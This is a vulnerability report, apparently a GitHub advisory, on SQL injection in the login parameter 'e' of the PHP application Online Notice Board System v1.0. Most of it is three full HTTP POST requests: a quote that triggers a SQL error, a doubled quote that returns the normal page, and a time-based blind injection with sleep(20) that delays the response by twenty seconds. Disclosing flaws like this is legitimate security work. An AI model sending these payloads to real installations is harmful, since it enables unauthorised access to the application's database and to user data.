# Online Notice Board System v1.0 by razormist has SQL injection

BUG_Author:Akela

vendors:https://www.sourcecodester.com/php/14317/online-notice-board-system.html

Vulnerability File: /Online Notice Board System/index.php?option=login

POST parameter 'e' exists SQL injection vulnerability

Payload1: e=1@2'&p=34&save=Login

```
POST /Online%20Notice%20Board%20System/index.php?option=login HTTP/1.1
Host: localhost
Content-Length: 23
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/Online%20Notice%20Board%20System/index.php?option=login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=h2td7dda0p1f3dha0mjlejh9vb
Connection: close

e=1@2'&p=34&save=Login
```

sql statement error

![image](https://github.com/XDWHQ/pic/blob/main/err.png)

Payload2: e=1@2''&p=34&save=Login

```
POST /Online%20Notice%20Board%20System/index.php?option=login HTTP/1.1
Host: localhost
Content-Length: 23
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/Online%20Notice%20Board%20System/index.php?option=login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=h2td7dda0p1f3dha0mjlejh9vb
Connection: close

e=1@2''&p=34&save=Login
```

correct page

![image](https://github.com/XDWHQ/pic/blob/main/right.png)

Payload3: e=1@2'%2b(select*from(select(sleep(20)))a)%2b'&p=34&save=Login

```
POST /Online%20Notice%20Board%20System/index.php?option=login HTTP/1.1
Host: localhost
Content-Length: 62
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/Online%20Notice%20Board%20System/index.php?option=login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=h2td7dda0p1f3dha0mjlejh9vb
Connection: close

e=1@2'%2b(select*from(select(sleep(20)))a)%2b'&p=34&save=Login
```

The response from the server is 20 seconds

![image](https://github.com/XDWHQ/pic/blob/main/sleep.png)

